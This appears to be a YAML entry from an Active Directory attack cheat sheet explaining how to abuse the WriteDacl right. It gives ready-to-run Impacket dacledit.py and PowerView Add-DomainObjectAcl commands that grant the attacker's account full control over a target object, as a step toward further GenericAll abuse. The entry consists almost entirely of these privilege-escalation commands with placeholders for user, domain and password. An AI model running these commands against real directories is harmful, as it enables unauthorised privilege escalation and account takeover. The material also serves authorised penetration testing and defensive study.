name: WriteDacl
description: Modify permissions - can grant yourself GenericAll
commands:
- '# Grant yourself GenericAll with Impacket'
- dacledit.py -action 'write' -rights 'FullControl' -principal '<YOUR_USER>' -target '<TARGET>' '<DOMAIN>/<YOUR_USER>:<PASSWORD>'
- ''
- '# PowerView'
- Add-DomainObjectAcl -TargetIdentity '<TARGET>' -PrincipalIdentity '<YOUR_USER>' -Rights All
- ''
- '# Then abuse GenericAll (see above)'
